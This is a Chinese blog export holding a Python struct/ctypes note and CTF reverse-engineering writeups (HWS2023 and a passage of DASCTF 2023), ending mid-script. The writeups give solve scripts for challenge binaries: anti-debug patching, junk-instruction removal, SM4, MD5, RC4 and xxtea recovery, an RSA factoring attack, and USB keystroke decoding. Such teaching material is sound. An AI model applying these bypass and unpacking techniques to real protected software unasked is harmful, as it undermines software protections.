BYTE ORDER SIZE ALIGNMENT @ native native native = native standard none &lt; little-endian standard none &gt; big-endian standard none ! network (= big-endian) standard none # 代码示例 假设我们从内存中 dump 下来了如下数据，已知该变量是以无符号 Int 类型存储到内存中的，因为在操作系统中数据都是小端存储，所以可以写出如下代码处理字节流规得到正确的变量的值 import structdata = [0x6f,0x4e,0x5f,0x59,0x30,0x55,0x5f,0x46,0x89,0x7b,0xa4,0xc3,0xc5,0xe3,0x78,0xb3,0xc3,0x92,0x87,0xb0,0x92,0x94,0xa4,0xd3]data = struct.unpack('&lt;6I',bytes(data))print(','.join(map(hex,list(data))))# 0x595f4e6f,0x465f5530,0xc3a47b89,0xb378e3c5,0xb08792c3,0xd3a49492当我们在 IDA 中遇到浮点数时，同样可以使用 struct 库来查看十六进制浮点数对应的十进制值 import structhex_float = b'\\x1f\\x85\\xebQ\\xb8\\x1e\\t@'float_num = struct.unpack('d',hex_float)#表示 double 类型print(float_num)#(3.14,)# ctypes 定义变量数值类型 我们知道在 python 中是没有所谓的 int , char 的概念的，但是在逆向的过程中，免不了要和这些 c 语言数据类型打交道，这个时候就需要我们使用 ctypes 库来作为 Python 和 C 之间的桥梁，来再 python 中对变量的数值类型进行定义，这样才不会导致移位右移的时候变量溢出，减法的时候变量的值被取到了负数等等我们不希望看到的情况发生 这是一个使用 ctypes 进行循环右移 16 位的简单示例，可以发现即使右移 16 位，变量的范围依然没有超出 uint import ctypes# 使用 c_uint 方法将 a 变量定义为 c 语言中的 uint (无符号整型), 并赋值 0x12345678a = ctypes.c_uint(0x12345678)# 使用 value 方法读取 a 变量的值 循环向右移动 16 位a = ctypes.c_uint((a.value&lt;&lt;16) | (a.value>>16))print(hex(a.value)) # 0x56781234ctypes 中间类型，C 类型和 python 类型对应关系如下表： ctypes 类型 C 类型 Python 类型 c_bool _Bool bool c_char char 单字符字节串对象 c_wchar wchar_t 单字符字符串 c_byte char int c_ubyte unsigned char int c_short short int c_ushort unsigned short int c_int int int c_uint unsigned int int c_long long int c_ulong unsigned long int c_longlong __int64 或 long long int c_ulonglong unsigned __int64 或 unsigned long long int c_size_t size_t int c_ssize_t ssize_t 或 Py_ssize_t int c_time_t time_t int c_float float float c_double double float c_longdouble long double float c_char_p char* (以 NUL 结尾) 字节串对象或 None c_wchar_p wchar_t* (以 NUL 结尾) 字符串或 None c_void_p void* int 或 None","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://oacia.dev/tags/python/"}]},{"title":"HWS2023夏令营CTF选拔赛writeup","slug":"hws-2023","date":"2023-07-17T03:26:21.000Z","updated":"2025-04-08T18:55:11.681Z","comments":true,"path":"hws-2023/","link":"","permalink":"https://oacia.dev/hws-2023/","excerpt":"","text":"hws 填完参赛问卷之后邮件被发到了垃圾箱里面，比赛开打好几个小时了才发现 (悲), 不过成绩还是不错滴，把逆向 ak 啦，第四名耶 (●’◡’●) 别的方向 misc 和 crypto 也稍微看了下，算是逆向之外的闲情雅致：), 但总归是能做出超级简单的题目的，但是 pwn 是真的不会！做不了一点… 不会 pwn 的二进制手只能当逆向手了😂 题目附件: 点击下载 # reverse # Android 反编译 libjniex.so , 发现这个解密函数，所使用的算法为 SM4 安装 apk, 打开后发现两个特殊字符串 159762dr7vh438sa 和 1313131313131313 于是写一下 exp import base64from pysm4 import encrypt_cbc, decrypt_cbcimport base64key = \"159762dr7vh438sa\" # 密钥iv = \"1313131313131313\"cipher_text = bytes.fromhex(\"663630067D8CD8A2D819CCE0996A2FC49AEA6B31CCCC2EEE5BE59BFA0B56597CCECA2F502A4D1F92E3BC731D915E9CE4\") # 加密后的数据plain_text = decrypt_cbc(base64.b64encode(cipher_text), key, iv)print(plain_text)# flag&#123;just!_enjoy!_the_match!_zyc_2022&#125;# Animals ida 打开 main, 发现有花指令形式如下，用 idapython 修复一下 import idautilsimport idcdef my_nop(addr, endaddr): while addr &lt; endaddr: patch_byte(addr, 0x90) addr += 1pattern = [\"74 15 75 13 8D 44 24 FC 83 F0 22 3B 04 24 74 0A E8 1F 00 00 00 74 04\", \"74 0A 75 08 E8 10 00 00 00 EB 04 E8\", \"48 81 EC 08 03 00 00\"]for i in range(len(pattern)): cur_addr = 0x406300 end_addr = 0x406E2C while cur_addr &lt; end_addr: cur_addr = idc.find_binary(cur_addr, SEARCH_DOWN, pattern[i]) print(\"patch address: \" + hex(cur_addr)) # 打印提示信息 if cur_addr == idc.BADADDR: break else: my_nop(cur_addr, cur_addr + len(pattern[i].split(' '))) cur_addr = idc.next_head(cur_addr)这里出现的常数说明算法应该是 MD5, 而且常数位置不一致，那么这应该是魔改的 md5 main 函数的前两行有 pthread 反调试 进入 sub_405FF0 把退出逻辑修改使其不退出 jnz short loc_40603E –&gt; jz short loc_40603E 动态调试发现最终比较的数组和静态分析的数组不一致，推测在运行的过程中这个比较的数组进行了修改 于是得到 exp, 要注意 md5.c 中的常数要和题目中的常数一致 #include &lt;stdio.h>#include &lt;string.h>#include &lt;stdlib.h>#include \"md5.h\"unsigned char target[16] = &#123; 0xDD, 0xB2, 0x6D, 0xF3, 0xE6, 0x0A, 0xC7, 0x83, 0x4A, 0x93, 0x50, 0xB4, 0xA4, 0x59, 0xAB, 0x0E&#125;;void md5_enc(unsigned char encrypt[])&#123; int i; unsigned char decrypt[16]; MD5_CTX md5; MD5Init(&amp;md5); MD5Update(&amp;md5,encrypt,strlen((char *)encrypt)); MD5Final(&amp;md5,decrypt); //printf(\"%s\\n\",encrypt); for(i=0;i&lt;16;i++) &#123; if(target[i]!=decrypt[i])&#123; return; &#125; &#125; printf(\"%s\\n\",encrypt); exit(2);&#125;void printCombinations(char* str, int index) &#123; if (index == 9) &#123; //printf(\"%s\\n\", str); md5_enc(str); return; &#125; char* animal[] = &#123; \"cat\", \"dog\", \"fox\", \"panda\", \"dragon\",\"monkey\" &#125;; for (int i = 0; i &lt; 6; i++) &#123; strncat(str,animal[i],strlen(animal[i])); //strcat(str,animal[i]); //printf(\"%c\\n\",str[0]); printCombinations(str, index + 1); str[strlen(str) - strlen(animal[i])] = '\\0'; &#125;&#125;int main(int argc, char *argv[])&#123; char str[60]; str[0] = '\\0'; printCombinations(str, 0); return 0;&#125;脚本输出 catmonkeydogdragondogcatfoxpandapanda , 那么输入的数字就应该是 051410233 md5 一下得到 flag flag&#123;839c998c52db6618bb24c346b85a894f&#125; # E 查一下属性，这个程序是易语言写的 用 ida 插件 E-Decompiler 来静态分析一下 使用插件后因为有中文名右边显示的名称为 __ , 但是我又不太想 patch ida 去修复，所以就索性把所有中文的函数名手工翻译成英文好了 通过交叉引用 wrong 字符串，找到主要函数在 sub_4010C8 分析一下这个函数，加密流程主要将字符串平均分成左右两部分去进行加密 用 python 的话这样表示 import ctypesimport stringdef left_enc(L_str): L_str.value = ((L_str.value &lt;&lt; 1) ^ 0xBF) >> 1 return L_strdef right_enc(L_str): L_str.value = ((L_str.value &lt;&lt; 1) ^ 0x81) >> 1 return L_strtext = \"0123456789.-\"res = string.printablefor ch in text: for i in res: out = left_enc(ctypes.c_uint8(ord(i))) if out.value == ord(ch): print(f\"&#123;i&#125;==> &#123;ch&#125;\",end='') for i in res: out = right_enc(ctypes.c_uint8(ord(i))) if out.value == ord(ch): print(f\" &lt;==&#123;i&#125;\")# nmlkjiqrstuv'''o==> 0 &lt;==pn==> 1 &lt;==qm==> 2 &lt;==rl==> 3 &lt;==sk==> 4 &lt;==tj==> 5 &lt;==ui==> 6 &lt;==vh==> 7 &lt;==wg==> 8 &lt;==xf==> 9 &lt;==yq==> . &lt;==nr==> - &lt;==m'''看了下第三方库识别不出来，就像这个样子 那就下一个易语言，然后把里面的 static_lib/eCalc_static.lib 制作成 ida 可以识别的 sig 文件，用到的工具是这个 然后 ida 导入这个 sig 导入完成之后就可以分析了 首先研究一下易语言中的大数在内存中的存储方式 写了一个例子方便去分析 静态编译后动调一下看这个 4381875973072142 是如何存储的 可以发现这个数被分为了两部分 39FFE70Eh 和 byte_1101510 byte_1101510 中的值为 42dcb3h 于是我们可以猜测一下大数的存储方式， 0x42dcb3 和 0x39ffe700e 经过什么样子的操作才可以得到 0xf914e66d1ae0e 最终经过一番尝试之后得到 那么就可以得出公式，假设一个大数 bignum 被分成了 p1 , p2 两部分，其中 p1 为高位则有 再看一下字符串加密之后，后面循环的内容 经过对大数存储方式的分析，就可以很方便的知道这些要做运算的数都是些什么了 Str1=v69*0x70955fc45 Str2[1]=Str1*v69 Str2[0]=v69*0x34ED1CCB v62[1]=Str2[0]+0x0D1558 v62[0]=Str2[1]+v62[1] v61=v70-v62[0] v69 为循环的变量，v70 为字符串左半部分的数字 整理之后 v61=v70-(v69*0x70955fc45*v69+v69*0x34ED1CCB+0x0D1558) 那要得到 v70 就需要这部分 (v69*0x70955fc45*v69+v69*0x34ED1CCB+0x0D1558) 加回去就可以了 再看一下得到 flag 的条件，那么左半部分就是 v69 从 1 到 800 累加，右半部分就是 v69 从 1 到 900 累加 这一题的左半部分大数运算的循环是有问题的，我们可以详细看看这部分的汇编以及对应的栈指针 40157A 处的汇编 add esp, 1Ch 将栈顶指针由 6C 移到了 50 , 栈顶指针在 50 指向的栈的内容是什么？找到 401543 处的 push ebx , 这个位置存储的是 [ebp+left_checksum] , 即 leftchecksum 的指针地址 看到 4015AE 处的 push 2000Ah , 这里的指针位置也是 50 , 也就是说，照着题目的汇编执行，本来在栈中存储 [ebp+left_checksum] 的内容将会被覆盖掉，于是程序走到 4017D1 后，不能 pop 出正确的 [ebp+left_checksum] 的值，给 ebx 赋的值是未知的，于是在 401544 处的 mov [ebx], ecx 会产生内存访问异常，所以即使是正确的输入，也不会输出 right 或者 wrong , 因为早在处理输入的字符串的左半部分时，就会因为内存读取异常而退出程序了 所以我把 40157A 处的汇编 add esp, 1Ch patch 成了 add esp, 18h , 让栈顶指针移到 54 这个位置，来保证栈内数据的稳定性，后续的分析也是直接跳过左半部分，而直接去分析右半部分的 而且左半部分 401570 处调用的函数，本应该赋值给 [ebp+var_18] 的 [ebp+left_checksum] 也没有出现，比对一下左右两半部分字符串中相对于循环位置相同的函数调用 (都是循环内的第一行函数函数调用), 发现是并不相同的，似乎是题目出了些问题 不过还是可以通过类比，得到 flag 的，因为左右两边的加密方式几乎完全相同 解释完题目本身的问题，现在给出 exp import ctypesimport stringdef left_enc(L_str): L_str.value = ((L_str.value &lt;&lt; 1) ^ 0xBF) >> 1 return L_strdef right_enc(L_str): L_str.value = ((L_str.value &lt;&lt; 1) ^ 0x81) >> 1 return L_str# print(chr(left_enc(ctypes.c_uint8(ord('&#123;'))).value))# print(chr(right_enc(ctypes.c_uint8(ord('&#125;'))).value))dic_left = &#123;&#125;dic_right = &#123;&#125;text = \"0123456789.\"res = string.printablefor ch in text: for i in res: out = left_enc(ctypes.c_uint8(ord(i))) if out.value == ord(ch): # print(f\"&#123;i&#125;==> &#123;ch&#125;\",end='') dic_left[ch] = i for i in res: out = right_enc(ctypes.c_uint8(ord(i))) if out.value == ord(ch): # print(f\" &lt;==&#123;i&#125;\") dic_right[ch] = i# nmlkjiqrstuv'''nnnnnnnnqqqqqqqqffffffffyyyyyyyyffffqfffyyyyqyyy999999==>0x11317d8''''''o==> 0 &lt;==pn==> 1 &lt;==qm==> 2 &lt;==rl==> 3 &lt;==sk==> 4 &lt;==tj==> 5 &lt;==ui==> 6 &lt;==vh==> 7 &lt;==wg==> 8 &lt;==xf==> 9 &lt;==yq==> . &lt;==nr==> - &lt;==m'''# v61=v70-(v69*0x70955fc45*v69+v69*0x34ED1CCB+0x0D1558)v70 = 0for v69 in range(1, 801): v70 = v70 + (v69 * 0x70955fc45 * v69 + v69 * 0x34ED1CCB + 0x0D1558)for i in str(v70): print(dic_left[i], end='')# print('')v70 = 0for v69 in range(1, 901): # v70 = (v69 * 0x70955fc45 * v69 + v69 * 0x34ED1CCB + 0x0D1558) v70 = v70 + (v69 * 0x70955fc45 * v69 + v69 * 0x34ED1CCB + 0x0D1558) # print(v70)for i in str(v70): print(dic_right[i], end='')# jnihhkjnhihomhmhmoowsuvtptwpsxpxrpxqpp# crypto # RSA 在网上找了一下这题和 AntCTF x D^3CTF 2022 的 d3factor 长的很像 于是就把 exp 的脚本拿过来，参数换成这题给的，就出 flag 了 # sagemathfrom Crypto.Util.number import *import gmpy2,hashlibN=26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977c=15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437e=65537e1=8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221e2=22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079r = 7a = (e2 - e1) * gmpy2.invert(e1*e2,N) % N# assert a &lt; NP.&lt;x> = PolynomialRing(Zmod(N))f = x - ax = f.small_roots(X = 2^1000,beta = 0.4)x = x[0] k_phi = e1*e2*x - (e2 - e1)p_ = gcd(k_phi,N)p = gmpy2.iroot(int(p_),r - 1)[0]# print(p)q = N // (p**r)# print(q)n = p * qphi_n = (p - 1) * (q - 1)d = gmpy2.invert(e,phi_n)# print(n)m = pow(c,d,n)print(bytes.decode(long_to_bytes(int(m))))# flag&#123;RSA_1s_s0_ez_4nd_hwser_c4n_bre4k_1t!&#125;# misc # USB 使用脚本得到键盘的输入的字符 import sys, argparse, osclass kbpaser: def __init__(self): #tshark 导出文件 self.datafile=\"kbdatafile.txt\" self.presses= [] #Keyboard Traffic Dictionary self.normalKeys = &#123;\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET>\",\"29\":\"&lt;ESC>\",\"2a\":\"&lt;DEL>\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE>\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON>\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA>\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP>\",\"3a\":\"&lt;F1>\",\"3b\":\"&lt;F2>\", \"3c\":\"&lt;F3>\",\"3d\":\"&lt;F4>\",\"3e\":\"&lt;F5>\",\"3f\":\"&lt;F6>\",\"40\":\"&lt;F7>\",\"41\":\"&lt;F8>\",\"42\":\"&lt;F9>\",\"43\":\"&lt;F10>\",\"44\":\"&lt;F11>\",\"45\":\"&lt;F12>\"&#125; #Press shift self.shiftKeys = &#123;\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET>\",\"29\":\"&lt;ESC>\",\"2a\":\"&lt;DEL>\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE>\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"&#123;\",\"30\":\"&#125;\",\"31\":\"|\",\"32\":\"&lt;NON>\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"&lt;GA>\",\"36\":\"&lt;\",\"37\":\">\",\"38\":\"?\",\"39\":\"&lt;CAP>\",\"3a\":\"&lt;F1>\",\"3b\":\"&lt;F2>\", \"3c\":\"&lt;F3>\",\"3d\":\"&lt;F4>\",\"3e\":\"&lt;F5>\",\"3f\":\"&lt;F6>\",\"40\":\"&lt;F7>\",\"41\":\"&lt;F8>\",\"42\":\"&lt;F9>\",\"43\":\"&lt;F10>\",\"44\":\"&lt;F11>\",\"45\":\"&lt;F12>\"&#125; def tshark_do(self, pcapfile, filterfield, fieldvalue): if os.name == \"nt\": if filterfield is not None: command = f\"tshark -r &#123;pcapfile&#125; -Y &#123;filterfield&#125; -T fields -e &#123;fieldvalue&#125; > &#123;self.datafile&#125;\" else: command = f\"tshark -r &#123;pcapfile&#125; -T fields -e &#123;fieldvalue&#125; > &#123;self.datafile&#125;\" try: os.system(command) print(\"tshark执行语句：\" + command) print(\"[+] Found : tshark导出数据成功\") except: print(\"tshark执行语句：\" + command) print(\"[+] Found : tshark导出数据失败\") elif os.name == \"posix\": #sed '/^\\s*$/d' 主要是去掉空行 if filterfield not in None: command = f\"tshark -r &#123;pcapfile&#125; -Y &#123;filterfield&#125; -T fields -e &#123;fieldvalue&#125; | sed '/^\\s*$/d' > &#123;self.datafile&#125;\" else: command = f\"tshark -r &#123;pcapfile&#125; -T fields -e &#123;fieldvalue&#125; | sed '/^\\s*$/d' > &#123;self.datafile&#125;\" try: os.system(command) print(\"tshark执行语句：\" + command) print(\"[+] Found : tshark导出数据成功\") except: print(\"tshark执行语句：\" + command) print(\"[+] Found : tshark导出数据失败\") #筛掉无用数据，改变数据格式 def formatkbdata(self): formatfile = open(\"formatKbdatafile.txt\",\"w\") with open(self.datafile, \"r\") as f: for i in f: # if len(i.strip(\"\\n\")) == 8: # Bytes = [i[j:j+2] for j in range(0, len(i.strip(\"\\n\")), 2)] # data = \":\".join(Bytes) # formatfile.writelines(data+\"\\n\") if len(i.strip(\"\\n\")) == 16: Bytes = [i[j:j+2] for j in range(0, len(i.strip(\"\\n\")), 2)] data = \":\".join(Bytes) formatfile.writelines(data+\"\\n\") formatfile.close() def jiemi(self): print(\"\\n-----开始解密Tshark导出的键盘数据-----\\n\") # 读取数据 z with open(\"formatKbdatafile.txt\", \"r\") as f: for line in f: self.presses.append(line[0:-1]) #去掉末尾的 \\n # 开始处理 result = [] for press in self.presses: if press == '': continue #thark 版本原因，导出数据格式不同 if ':' in press: Bytes = press.split(\":\") else: #两两分组 Bytes = [press[i:i+2] for i in range(0, len(press), 2)] print(Bytes) if Bytes[0] == \"00\": if Bytes[2] != \"00\" and self.normalKeys.get(Bytes[2]): result.append(self.normalKeys[Bytes[2]]) # print(result) elif int(Bytes[0],16) &amp; 0b10 or int(Bytes[0],16) &amp; 0b100000: # shift key is pressed. if Bytes[2] != \"00\" and self.normalKeys.get(Bytes[2]): # result.append(self.normalKeys[Bytes[2]]) result.append(self.shiftKeys[Bytes[2]]) else: print(\"[-] Unknow Key : %s\" % (Bytes[0])) print(\"[+] USB_Found : %s\" % (result)) # print(type(result)) flag = 0 for i in range(len(result)): try: a = result.index('&lt;DEL>') del result[a] del result[a - 1] except: pass for i in range(len(result)): try: if result[i] == \"&lt;CAP>\": flag += 1 result.pop(i) if flag == 2: flag = 0 if flag != 0: result[i] = result[i].upper() except: pass # print ('\\n [+] 键盘数据 output :' + \"\".join (result)) # 删除提取数据文件 rm_stat = eval(input(f\"-----是否删除tshark导出的文件 \\\"&#123;self.datafile&#125;\\\", 1 or 0-----\\n\")) if rm_stat == 1: os.remove(self.datafile)if __name__ == \"__main__\": #我的 vscode 工作区的原因，需要切换到当前目录 pwd = os.path.dirname(__file__) os.chdir(pwd) BANNER = r\"\"\" // / / // ) ) // ) ) // / / (( //___/ / ___ __ ___ ___ / ___ // / / \\\\ / __ ( // ) ) // ) ) // ) ) // ) ) //\\ \\ // / / ) ) // ) ) // // // / / // // \\ \\ ((___/ / ((___ / / //____/ / ((____ // ((___( ( ((____ // \\ \\ @MAY1AS\"\"\" print(BANNER) argobject = argparse.ArgumentParser(prog=\"UsbKbCracker\", description=\"\"\"This is a script for decrypt UsbKeyboardData \"\"\") argobject.add_argument('-f', \"--pcapfile\", required=True, help=\"here is your capturedata file\") argobject.add_argument('-e', \"--fieldvalue\", required=True, help=\"here is your output_format\") argobject.add_argument('-Y', \"--filterfield\", help=\"here is your filter\") arg = argobject.parse_args() kbparser = kbpaser() # tshark 导出数据，存储在 usbdatafile.txt 内 kbparser.tshark_do(pcapfile=arg.pcapfile, fieldvalue=arg.fieldvalue, filterfield=arg.filterfield) kbparser.formatkbdata() kbparser.jiemi() 跟着这里的 USB_Found 敲键盘得到 Ao(mgHY$\\A@Q7gW2D$dE@6#oO0f&lt;Gm1hAI'/N#4&lt;AN;MS@PfrQ149K 可以发现这是 BASE85 加密 解密一下得到 flag flag&#123;ec1b8b96-56a9-f15c-4e39-503e92ab45d2&#125;","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://oacia.dev/tags/CTF/"},{"name":"逆向","slug":"逆向","permalink":"https://oacia.dev/tags/%E9%80%86%E5%90%91/"},{"name":"易语言","slug":"易语言","permalink":"https://oacia.dev/tags/%E6%98%93%E8%AF%AD%E8%A8%80/"}]},{"title":"DASCTF 2023六月挑战赛 二进制专项 RE writeup","slug":"DASCTF-2023六月挑战赛-二进制专项-RE-writeup","date":"2023-06-04T10:24:07.000Z","updated":"2025-04-08T18:55:11.339Z","comments":true,"path":"DASCTF-2023六月挑战赛-二进制专项-RE-writeup/","link":"","permalink":"https://oacia.dev/DASCTF-2023%E5%85%AD%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9-RE-writeup/","excerpt":"","text":"常年不去上早八课的人，今天居然在八点前就醒了，要问为什么？这比赛从早上八点打到晚上八点 &gt;…&lt;(悲) 不过，咱们队伍在下午就把逆向题 ak 了～居然没有坐牢到晚上 (●’◡’●) 题目附件: 点击下载 # careful 动态调试，题目里有个 inline hook, 在这里打个断点 那么网址就是 Just_An_APIH00k11.com # babyre die 查一下壳 有 sleep 反调试，把 sleep nop 掉 这里读取了名称为 cod 的资源，用 resource hacker 把资源复制下来 然后向下执行，这里是一个对 cod 资源进行解密的地方 这里要注意的是如果检测到调试器，那么 byte_7FF6DA64F000[3] 将会被赋值为 36 所以要把这个 if 语句通过修改 ZF 标志位的方式来绕过反调试 cod 资源解密脚本如下 arr = [0x18, 0x57, 0x68, 0x64]with open('COD101.bin', 'rb') as f: b = f.read()b = bytearray(b)for i in range(len(b)): b[i] = b[i] ^ arr[i % 4]with open('COD_de.bin', 'wb') as f: f.write(b)用 ida 打开，看到有花指令 nop 一下，主要的改动有这几处 ​ 于是得到如下的伪代码 看算法是魔改的 RC4,exp 如下 class RC4: def __init__(self, key) -> None: self.key = key self.S = 0 self.__rc4_init__() def __rc4_init__(self): S = [i for i in range(256)] j = 0 for i in range(256): j = (2 * j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] self.S = S def rc4_encrypt(self, plain) -> list: i = 0 j = 0 cipher = [] cnt = 0 for p in plain: p = (p + 256 - cnt % 0xd) % 256 cnt += 1 i = (i + j) % 256 j = (j + self.S[i]) % 256 self.S[i], self.S[j] = self.S[j], self.S[i] tmp = self.S[(self.S[i] + self.S[j] + j) % 256] k = p ^ tmp cipher.append(k) return cipherkey = [0x5D , 0x42 , 0x62 , 0x29 , 0x3, 0x36 , 0x47 , 0x41 , 0x15, 0x36]data = [0xF7, 0x2E, 0x34, 0xF0, 0x72, 0xCF, 0x5E, 0x0A, 0xBB, 0xEC, 0xB1, 0x2B, 0x70, 0x88, 0x88, 0xED,0x46, 0x38, 0xDB, 0xDA, 0x6C, 0xBD, 0xD4, 0x06, 0x77, 0xF2, 0xCF, 0x56, 0x88, 0xC6, 0x31, 0xD2,0xB7, 0x5A, 0xC1, 0x42, 0xB0, 0xF4, 0x48, 0x37, 0xF5, 0x2C, 0xF5, 0x58]rc4 = RC4(key)plain = rc4.rc4_encrypt(data)print(''.join(map(chr,plain)))# ez_exe 查个壳，是 python 逆向 用 pyinstxtractor 脱一下 用在线网站看一下 ez_py.pyc 的源代码 #!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 3.11import ctypesfrom time import *from ctypes import *from ctypes import wintypesfrom hashlib import md5class _STARTUPINFO(Structure): _fields_ = [ ('cb', c_ulong), ('lpReserved', c_char_p), ('lpDesktop', c_char_p), ('lpTitle', c_char_p), ('dwX', c_ulong), ('dwY', c_ulong), ('dwXSize', c_ulong), ('dwYSize', c_ulong), ('dwXCountChars', c_ulong), ('dwYCountChars', c_ulong), ('dwFillAttribute', c_ulong), ('dwFlags', c_ulong), ('wShowWindow', c_ushort), ('cbReserved2', c_ushort), ('lpReserved2', c_char_p), ('hStdInput', c_ulong), ('hStdOutput', c_ulong), ('hStdError', c_ulong)]class _PROCESS_INFORMATION(Structure): _fields_ = [ ('hProcess', c_void_p), ('hThread', c_void_p), ('dwProcessId', c_ulong), ('dwThreadId', c_ulong)]StartupInfo = _STARTUPINFO()ProcessInfo = _PROCESS_INFORMATION()key1 = bytes(md5(b'bin1bin1bin1').hexdigest().encode())file = open('bin1', 'rb').read()arr = range(len(file))()open('bin1', 'wb').write(bytes(arr))sleep(0)bet = ctypes.windll.kernel32.CreateProcessA(b'bin1', ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), byref(StartupInfo), byref(ProcessInfo))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ProcessInfo.hProcess), ctypes.c_int(-1))open('bin1', 'wb').write(file)用 ida 反编译 bin1 失败，看来是被加密了 用这个代码看一下字节码 import marshal, disf = open(\"ez_py.pyc\", \"rb\").read()code = marshal.loads(f[16:]) #这边从 16 位开始取因为是 python3 python2 从 8 位开始取dis.dis(code)在最后面得到了这个 Disassembly of &lt;code object &lt;listcomp> at 0x00000297CC7F8E70, file \"ez_py.py\", line 59>: 59 0 RESUME 0 2 BUILD_LIST 0 4 LOAD_FAST 0 (.0) >> 6 FOR_ITER 50 (to 108) 8 STORE_FAST 1 (i) 10 LOAD_GLOBAL 0 (key1) 22 LOAD_FAST 1 (i) 24 LOAD_GLOBAL 3 (NULL + len) 36 LOAD_GLOBAL 0 (key1) 48 PRECALL 1 52 CALL 1 62 BINARY_OP 6 (%) 66 BINARY_SUBSCR 76 LOAD_GLOBAL 4 (file) 88 LOAD_FAST 1 (i) 90 BINARY_SUBSCR 100 BINARY_OP 12 (^) 104 LIST_APPEND 2 106 JUMP_BACKWARD 51 (to 6) >> 108 RETURN_VALUE那么解密代码如下 from hashlib import md5key1 = bytes(md5(b'bin1bin1bin1').hexdigest().encode())# print(key1)file = open('bin1', 'rb').read()arr = [key1[i % len(key1)] ^ file[i] for i in range(len(file))]# open('bin1', 'wb').write(bytes(arr))with open('bin1__','wb') as f: f.write(bytes(arr))反编译出来是这个 那根据提示我们把上面的解密脚本稍作修改 from hashlib import md5key1 = bytes(md5(b'bin2bin2bin2').hexdigest().encode())# print(key1)file = open('bin2', 'rb').read()arr = [key1[i % len(key1)] ^ file[i] for i in range(len(file))]# open('bin1', 'wb').write(bytes(arr))with open('bin2__','wb') as f: f.write(bytes(arr))然后用 ida 反编译 bin2__ 那么这就是正常的逆向题了 btea 函数里面是这个，这是一个 xxtea 算法 写一下 exp #include &lt;iostream>#include &lt;stdio.h>using namespace std;#include &lt;stdint.h>#define DELTA 0x7937B99E#define MX (((z>>5^y&lt;&lt;2) + (y>>3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t* v, int n, uint32_t const key[4]) &#123; uint32_t y, z, sum; unsigned p, rounds, e; if (n > 1) &#123; /* Coding Part */ rounds = /*6 + */52 / n; sum = 0; z = v[n - 1]; do &#123; sum += DELTA; e = (sum >> 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) &#123; y = v[p + 1]; z = v[p] += MX; &#125; y = 